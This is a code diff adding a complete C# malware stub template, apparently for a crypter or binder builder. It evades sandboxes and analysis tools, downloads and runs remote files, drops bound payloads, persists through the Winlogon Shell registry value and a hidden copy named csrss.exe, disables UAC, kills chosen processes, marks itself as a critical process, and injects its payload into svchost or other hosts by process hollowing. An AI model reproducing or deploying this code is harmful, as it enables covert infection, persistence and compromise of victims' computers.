@@ -1,0 +1,709 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Reflection;
+using System.Resources;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Threading;
+using System.IO;
+using System.Diagnostics;
+using System.IO.Compression;
+using System.Net;
+using System.Collections.Generic;
+using System.Security.AccessControl;
+using System.Security.Principal;
+
+namespace Program
+{
+    class Program
+    {
+        static bool Startup = %STARTUP%;
+        static string Location = "%LOCATION%";
+        static string StartupFileName = "%FILENAME%";
+        static bool Melt = %MELT%;
+        static bool Compressed = %COMPRESSED%;
+
+        static string CMD = "%CMD%";
+        static string InjectLoc = "%INJECT%";
+		static bool DisableUAC = %DISABLEUAC%;
+
+        static bool Sleep = %SLEEP%;
+        static int SleepInt = %SLEEPTIME%;
+
+        static bool AntiSandboxie = %ANTISANDBOXIE%;
+        static bool AntiWS = %ANTIWS%;
+        static bool AntiWPE = %ANTIWPE%;
+        static bool AntiEmulation = %ANTIEMULATION%;
+
+        static bool Message = %MESSAGE%;
+        static bool MessageOnFirstOnly = %MESSAGEONFIRST%;
+        static MessageBoxButtons MessageButton = MessageBoxButtons.%MESSAGEBUTTON%;
+        static MessageBoxIcon MessageIcon = MessageBoxIcon.%MESSAGEICON%;
+        static string MessageText = "%MESSAGETEXT%";
+        static string MessageTitle = "%MESSAGETITLE%";
+
+        static string[] BindNames = new string[] { %BINDNAMES% };
+        static string[] BindLocations = new string[] { %BINDLOCATIONS% };
+        static bool?[] BindRun = new bool?[] { %BINDRUN%  };
+        static string[] DownNames = new string[] { %DOWNNAMES% };
+        static string[] DownLocations = new string[] { %DOWNLOCATIONS% };
+        static bool?[] DownRun = new bool?[] { %DOWNRUN% };
+
+		static bool HideFile = %HIDEFILE%;
+		static bool	RegPers = %REGPERS%;
+		static bool ProcPers = %PROCPERS%;
+		static bool Critical = %CRITICAL%;
+		static bool Elevated = %ELEVATED%;
+		static string ProcKill = "%PROCKILL%";
+
+        static void Main(string[] args)
+        {
+			if(args.Length == 0)
+			{
+            if (AntiSandboxie)
+                DetectSandboxie();
+            if (AntiWS)
+                DetectWireshark();
+            if (AntiWPE)
+                DetectWPE();
+            if (AntiEmulation)
+                DetectEmulation();
+            if (Sleep)
+                Thread.Sleep(SleepInt);
+            if (Message)
+                if (!MessageOnFirstOnly || (MessageOnFirstOnly && Application.StartupPath != GetPath(Location)))
+                    new Thread(new ThreadStart(delegate() {MessageBox.Show(MessageText, MessageTitle, MessageButton, MessageIcon, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);})).Start();
+            ResourceManager m = new ResourceManager("res", Assembly.GetExecutingAssembly());
+			for (int i = 0; i < BindNames.Length; i++)
+                try
+                {
+					if(BindRun[i] != null)
+						if((bool)BindRun[i] || (!(bool)BindRun[i] && Application.StartupPath != GetPath(Location) && Startup))
+						{
+							byte[] binded = (byte[])m.GetObject("BIND" + i.ToString());
+							if (Compressed)
+								binded = Decompress(binded);
+							File.WriteAllBytes(GetPath(BindLocations[i]) + "\\" + BindNames[i], binded);
+							Process.Start(GetPath(BindLocations[i]) + "\\" + BindNames[i]);
+						}
+                }
+                catch { }
+            WebClient client = new WebClient();
+            for (int i = 0; i < DownNames.Length; i++)
+                try
+                {
+					if(DownRun[i] != null)
+						if((bool)DownRun[i] || (!(bool)DownRun[i] && Application.StartupPath != GetPath(Location) && Startup))
+							{
+								string downname = DownNames[i].Split('/')[DownNames[i].Split('/').Length - 1];
+					            if (File.Exists(GetPath(DownLocations[i]) + "\\" + downname))
+									File.Delete(GetPath(DownLocations[i]) + "\\" + downname);
+								client.DownloadFile(DownNames[i], GetPath(DownLocations[i]) + "\\" + downname);
+		                        Process.Start(GetPath(DownLocations[i]) + "\\" + downname);
+							}
+		        }
+                catch { }
+			if (Startup && Application.StartupPath != GetPath(Location))
+            {
+                try
+                {
+                    if (File.Exists(GetPath(Location) + "\\" + StartupFileName))
+                        File.Delete(GetPath(Location) + "\\" + StartupFileName);
+                }
+                catch { Environment.Exit(0); }
+                if (Melt)
+                    try
+                    {
+                        File.Move(Application.ExecutablePath, GetPath(Location) + "\\" + StartupFileName);
+                    }
+                    catch { }
+                else
+                    try
+                    {
+                        File.Copy(Application.ExecutablePath, GetPath(Location) + "\\" + StartupFileName);
+                    }
+                    catch { }
+                try
+                {
+                    Process.Start(GetPath(Location) + "\\" + StartupFileName);
+                    Environment.Exit(0);
+                }
+                catch { }
+            }
+            if (Startup)
+            {
+                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+                key.SetValue("Shell", "explorer.exe, " + Application.ExecutablePath);
+				try
+                {
+                    RegistryKey key2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
+					key2.SetValue("Shell", "explorer.exe, " + Application.ExecutablePath);				
+				}
+                catch { }
+            }
+			if(DisableUAC)
+				try
+				{
+					RegistryKey uackey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\Current Version\\Policies\\System");
+					uackey.SetValue("EnableLUA", 0);
+				}
+				catch { }
+			if(HideFile)
+				new FileInfo(Application.ExecutablePath).Attributes = FileAttributes.Hidden | FileAttributes.System;
+            byte[] mainfile = (byte[])m.GetObject("MAIN");
+            if (Compressed)
+                mainfile = Decompress(mainfile);
+			if(Critical)
+			try
+			{
+                Process.EnterDebugMode();
+			}
+			catch { }				
+			int handle = 0;
+			Assembly a = Assembly.GetExecutingAssembly();
+			bool loaded = true;
+            try
+            {
+				a = Assembly.Load(mainfile);
+				handle = Process.GetCurrentProcess().Id;
+            }
+            catch
+            {
+				loaded = false;
+                handle = Run(mainfile, CMD, GetInjectionPath(InjectLoc));
+				if(Critical)
+					CriticalProcess(IdToPtr(handle));
+				if(Elevated)
+					ElevateProcess(IdToPtr(handle));
+            }
+			if(RegPers || ProcPers || !string.IsNullOrEmpty(ProcKill))
+			{
+				try
+				{
+					if(File.Exists(GetPath("appdata") + "\\csrss.exe"))
+						File.Delete(GetPath("appdata") + "\\csrss.exe");
+					File.Copy(Application.ExecutablePath, GetPath("appdata") + "\\csrss.exe");
+					new FileInfo(GetPath("appdata") + "\\csrss.exe").Attributes = FileAttributes.Hidden | FileAttributes.System;
+				}
+				catch{}
+				try
+				{
+					Process.Start(GetPath("appdata") + "\\csrss.exe", (RegPers ? @"-reg ""explorer.exe, " + Application.ExecutablePath + @""" ": "") + (!string.IsNullOrEmpty(ProcKill) ? "-prockill " + ProcKill + " " : "") + (ProcPers ? "-proc " + handle.ToString() + " " + Application.ExecutablePath : "")); 
+				}
+				catch{}
+			}
+			if(loaded)
+			{
+				if(Critical)
+					CriticalProcess(Process.GetCurrentProcess().Handle);
+				if(Elevated)
+					ElevateProcess(Process.GetCurrentProcess().Handle);
+				InvokeDotNet(a, CMD.Split(' '));
+			}
+			}
+			else
+			{
+				ElevateProcess(Process.GetCurrentProcess().Handle);
+				for(int i = 0; i < args.Length - 1; i+= 2)
+					if(args[i] == "-reg")
+						{
+							RegistryPers(Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), "Shell", args[i + 1]);
+							try
+							{
+								RegistryPers(Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), "Shell", args[i + 1]);
+							}catch{}
+						}
+					else if(args[i] == "-proc")
+						{
+							ProcessPers(int.Parse(args[i + 1]), args[i + 2]);
+						}
+					else if(args[i] == "-prockill")
+						{
+							KillProc(new List<string>(args[i + 1].Split('|')));
+						}
+				if(Critical)
+				try
+				{
+					Process.EnterDebugMode();
+					CriticalProcess(Process.GetCurrentProcess().Handle);
+				}
+				catch{}
+				while(true)
+					Thread.Sleep(10000);
+			}
+        }
+
+		static IntPtr IdToPtr(int id)
+		{
+			foreach(Process p in Process.GetProcesses())
+				try
+				{
+				if(p.Id == id)
+					return p.Handle;
+				}
+				catch { }
+			return IntPtr.Zero;
+		}
+
+		static void InvokeDotNet(Assembly a, string[] args)
+        {
+            Thread t = new Thread(new ThreadStart(delegate()
+                {
+                    try
+                    {
+                        a.EntryPoint.Invoke(null, null);
+                    }
+                    catch 
+                    {
+                        a.EntryPoint.Invoke(null, new object[] { args });                    
+                    }
+                }));
+            t.SetApartmentState(ApartmentState.STA);
+            t.Start();
+        }
+
+		[DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In()]
+		byte[] pSecurityDescriptor);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out()]
+		byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);
+
+		static void ElevateProcess(IntPtr handle)
+        {
+			try
+			{
+            byte[] buff = new byte[0];
+            uint setblock = 0;
+            GetKernelObjectSecurity(handle, 0x4, buff, 0, ref setblock);
+            buff = new byte[setblock];
+            GetKernelObjectSecurity(handle, 0x4, buff, setblock, ref setblock);
+            RawSecurityDescriptor des = new RawSecurityDescriptor(buff, 0);
+            des.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0xf0000 | 0x100 | 0xfff), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
+            buff = new byte[des.BinaryLength];
+            des.GetBinaryForm(buff, 0);
+            SetKernelObjectSecurity(handle, 0x4, buff);
+			}
+			catch { }
+        }
+
+		[DllImport("ntdll.dll", SetLastError = true)]
+		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+		static void CriticalProcess(IntPtr handle)
+        {
+            try
+            {
+                int isCritical = 1;
+                int BreakOnTermination = 0x1D;
+                NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
+            }
+            catch { }
+        }
+
+		static void KillProc(List<string> procs)
+		{
+			new Thread(new ThreadStart(delegate()
+				{
+					while(true)
+					{
+						foreach(Process p in Process.GetProcesses())
+							try
+							{
+								if(procs.Contains(p.ProcessName))
+									p.Kill();
+							}
+							catch { }
+							Thread.Sleep(100);
+					}
+				})).Start();
+		}
+
+		static void ProcessPers(int handle, string ploc)
+        {
+            new Thread(new ThreadStart(delegate()
+                {
+                    while (true)
+                    {
+                        try
+                        {
+                            bool found = false;
+                            foreach (Process p in Process.GetProcesses())
+                            try
+							{
+							    if (p.Id == handle)
+                                    found = true;
+							}
+							catch{}
+                            if (!found)
+                            {
+                                Process.Start(ploc);
+                                Environment.Exit(0);
+                            }
+                        }
+                        catch { }
+                        Thread.Sleep(1000);
+                    }
+                }
+            )).Start();
+        }
+
+		static void RegistryPers(RegistryKey Key, string Name, string Value)
+        {
+            new Thread(new ThreadStart(delegate()
+                {
+                    while (true)
+                    {
+                        try
+                        {
+                                Key.SetValue(Name, Value);
+                        }
+                        catch { }
+                        Thread.Sleep(1000);
+                    }
+                })).Start();
+        }
+
+        static byte[] Decompress(byte[] data)
+        {
+            using (MemoryStream st = new MemoryStream(data))
+            {
+                using (GZipStream g = new GZipStream(st, CompressionMode.Decompress))
+                {
+                    byte[] buffer = new byte[data.Length * 5];
+                    Array.Resize(ref buffer, g.Read(buffer, 0, buffer.Length));
+                    return buffer;
+                }
+            }
+        }
+
+        private static void DetectSandboxie()
+        {
+            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+            {
+                Environment.Exit(1);
+            }
+        }
+        private static void DetectEmulation()
+        {
+            long tickCount = Environment.TickCount;
+            Thread.Sleep(500);
+            long tickCount2 = Environment.TickCount;
+            if (((tickCount2 - tickCount) < 500L))
+            {
+                Environment.Exit(1);
+            }
+        }
+
+        private static void DetectWPE()
+        {
+            Process[] ProcessList = Process.GetProcesses();
+            foreach (Process proc in ProcessList)
+            {
+                if (proc.MainWindowTitle.Equals("WPE PRO"))
+                {
+                    Environment.Exit(1);
+                }
+            }
+        }
+
+        private static void DetectWireshark()
+        {
+            Process[] ProcessList = Process.GetProcesses();
+            foreach (Process proc in ProcessList)
+            {
+                if (proc.MainWindowTitle.Equals("The Wireshark Network Analyzer"))
+                {
+                    Environment.Exit(1);
+                }
+            }
+        }
+
+        static string GetPath(string path)
+        {
+            switch (path.ToLower())
+            {
+                case "appdata":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+                case "windows":
+                    return Environment.GetEnvironmentVariable("WinDir");
+
+                case "system32":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.System);
+
+                case "temp":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.Templates);
+
+                case "program files":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+
+                default:
+                    goto case "appdata";
+            }
+        }
+
+        static string GetInjectionPath(string injection)
+        {
+            switch (injection.ToLower())
+            {
+                case "svchost":
+                    return Environment.GetEnvironmentVariable("WinDir") + "\\System32\\svchost.exe";
+
+                case "vbc":
+                    return Environment.GetEnvironmentVariable("WinDir") + @"\Microsoft.NET\Framework\v2.0.50727\vbc.exe";
+
+                case "itself":
+                    return Application.ExecutablePath;
+
+                case "iexplore":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Internet Explorer\\iexplore.exe";
+
+                default:
+                    try
+                    {
+                        if (File.Exists(GetPath("appdata") + "\\" + injection))
+                            File.Delete(GetPath("appdata") + "\\" + injection);
+                        File.Copy(GetInjectionPath("vbc"), GetPath("appdata") + "\\" + injection);
+                        return GetPath("appdata") + "\\" + injection;
+                    }
+                    catch { goto case "vbc"; }
+            }
+        }
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        static extern bool CreateProcess(string lpApplicationName,
+        string lpCommandLine, IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes, bool bInheritHandles,
+        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+        byte[] lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+           uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+        [DllImport("ntdll.dll")]
+        private static extern bool NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool SetThreadContext(IntPtr hThread, [In] ref CONTEXT lpContext);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct IMAGE_DOS_HEADER
+        {
+            public UInt16 e_magic;
+            public UInt16 e_cblp;
+            public UInt16 e_cp;
+            public UInt16 e_crlc;
+            public UInt16 e_cparhdr;
+            public UInt16 e_minalloc;
+            public UInt16 e_maxalloc;
+            public UInt16 e_ss;
+            public UInt16 e_sp;
+            public UInt16 e_csum;
+            public UInt16 e_ip;
+            public UInt16 e_cs;
+            public UInt16 e_lfarlc;
+            public UInt16 e_ovno;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            public UInt16[] e_res1;
+            public UInt16 e_oemid;
+            public UInt16 e_oeminfo;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
+            public UInt16[] e_res2;
+            public Int32 e_lfanew;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct IMAGE_FILE_HEADER
+        {
+            public UInt16 Machine;
+            public UInt16 NumberOfSections;
+            public UInt32 TimeDateStamp;
+            public UInt32 PointerToSymbolTable;
+            public UInt32 NumberOfSymbols;
+            public UInt16 SizeOfOptionalHeader;
+            public UInt16 Characteristics;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct FLOATING_SAVE_AREA
+        {
+            public uint ControlWord;
+            public uint StatusWord;
+            public uint TagWord;
+            public uint ErrorOffset;
+            public uint ErrorSelector;
+            public uint DataOffset;
+            public uint DataSelector;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
+            public byte[] RegisterArea;
+            public uint Cr0NpxState;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct CONTEXT
+        {
+            public uint ContextFlags;
+            public uint Dr0;
+            public uint Dr1;
+            public uint Dr2;
+            public uint Dr3;
+            public uint Dr6;
+            public uint Dr7;
+            public FLOATING_SAVE_AREA FloatSave;
+            public uint SegGs;
+            public uint SegFs;
+            public uint SegEs;
+            public uint SegDs;
+            public uint Edi;
+            public uint Esi;
+            public uint Ebx;
+            public uint Edx;
+            public uint Ecx;
+            public uint Eax;
+            public uint Ebp;
+            public uint Eip;
+            public uint SegCs;
+            public uint EFlags;
+            public uint Esp;
+            public uint SegSs;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+            public byte[] ExtendedRegisters;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct IMAGE_DATA_DIRECTORY
+        {
+            public UInt32 VirtualAddress;
+            public UInt32 Size;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct IMAGE_OPTIONAL_HEADER32
+        {
+            public UInt16 Magic;
+            public Byte MajorLinkerVersion;
+            public Byte MinorLinkerVersion;
+            public UInt32 SizeOfCode;
+            public UInt32 SizeOfInitializedData;
+            public UInt32 SizeOfUninitializedData;
+            public UInt32 AddressOfEntryPoint;
+            public UInt32 BaseOfCode;
+            public UInt32 BaseOfData;
+            public UInt32 ImageBase;
+            public UInt32 SectionAlignment;
+            public UInt32 FileAlignment;
+            public UInt16 MajorOperatingSystemVersion;
+            public UInt16 MinorOperatingSystemVersion;
+            public UInt16 MajorImageVersion;
+            public UInt16 MinorImageVersion;
+            public UInt16 MajorSubsystemVersion;
+            public UInt16 MinorSubsystemVersion;
+            public UInt32 Win32VersionValue;
+            public UInt32 SizeOfImage;
+            public UInt32 SizeOfHeaders;
+            public UInt32 CheckSum;
+            public UInt16 Subsystem;
+            public UInt16 DllCharacteristics;
+            public UInt32 SizeOfStackReserve;
+            public UInt32 SizeOfStackCommit;
+            public UInt32 SizeOfHeapReserve;
+            public UInt32 SizeOfHeapCommit;
+            public UInt32 LoaderFlags;
+            public UInt32 NumberOfRvaAndSizes;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            public IMAGE_DATA_DIRECTORY[] DataDirectory;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct IMAGE_NT_HEADERS
+        {
+            public UInt32 Signature;
+            public IMAGE_FILE_HEADER FileHeader;
+            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+        }
+
+        private struct IMAGE_SECTION_HEADER
+        {
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+            public byte[] Name;
+            public UInt32 VirtualSize;
+            public UInt32 VirtualAddress;
+            public UInt32 SizeOfRawData;
+            public UInt32 PointerToRawData;
+            public UInt32 PointerToRelocations;
+            public UInt32 PointerToLinenumbers;
+            public UInt16 NumberOfRelocations;
+            public UInt16 NumberOfLinenumbers;
+            public UInt32 Characteristics;
+        }
+
+        static public int Run(byte[] file, string cmd, string location)
+        {
+            GCHandle gHandle = GCHandle.Alloc(file, GCHandleType.Pinned);
+            int iPointer;
+            uint outtt;
+            UIntPtr outt;
+            iPointer = gHandle.AddrOfPinnedObject().ToInt32();
+            CONTEXT CTX = new CONTEXT();
+            IMAGE_DOS_HEADER DHD = new IMAGE_DOS_HEADER();
+            IMAGE_NT_HEADERS NHD = new IMAGE_NT_HEADERS();
+            IMAGE_SECTION_HEADER SHD = default(IMAGE_SECTION_HEADER);
+            PROCESS_INFORMATION procinf = new PROCESS_INFORMATION();
+            DHD = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(new IntPtr(iPointer), typeof(IMAGE_DOS_HEADER));
+            NHD = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(new IntPtr(iPointer + DHD.e_lfanew), typeof(IMAGE_NT_HEADERS));
+            CreateProcess(location, cmd, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, new byte[0x44], out procinf);
+            NtUnmapViewOfSection(procinf.hProcess, (IntPtr)NHD.OptionalHeader.ImageBase);
+            if (VirtualAllocEx(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase), NHD.OptionalHeader.SizeOfImage, 0x1000 | 0x2000, 0x40) == IntPtr.Zero)
+                Run(file, cmd, location);
+            CTX.ContextFlags = (0x10000 | 0x01) | (0x10000 | 0x02) | (0x10000 | 0x04);
+            GetThreadContext(procinf.hThread, ref CTX);
+            WriteProcessMemory(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase), file, NHD.OptionalHeader.SizeOfHeaders, out outt);
+            for (int a = 0; a < NHD.FileHeader.NumberOfSections; a++)
+            {
+                SHD = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(new IntPtr(iPointer + DHD.e_lfanew + Marshal.SizeOf(NHD) + (a * Marshal.SizeOf(SHD))), typeof(IMAGE_SECTION_HEADER));
+                byte[] bRaw = new byte[SHD.SizeOfRawData + 1];
+                for (int y = 0; y < (int)SHD.SizeOfRawData; y++)
+                    bRaw[y] = file[SHD.PointerToRawData + y];
+                WriteProcessMemory(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase + SHD.VirtualAddress), bRaw, Convert.ToUInt32(SHD.SizeOfRawData), out outt);
+                VirtualProtectEx(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase + SHD.VirtualAddress), SHD.VirtualSize, 0x40, out outtt);
+            }
+            byte[] bIB = BitConverter.GetBytes(NHD.OptionalHeader.ImageBase);
+            WriteProcessMemory(procinf.hProcess, new IntPtr(CTX.Ebx + 8), bIB, (uint)bIB.Length, out outt);
+            CTX.Eax = (NHD.OptionalHeader.ImageBase + NHD.OptionalHeader.AddressOfEntryPoint);
+            SetThreadContext(procinf.hThread, ref CTX);
+            ResumeThread(procinf.hThread);
+			return procinf.dwProcessId;
+        }
+    }
+}
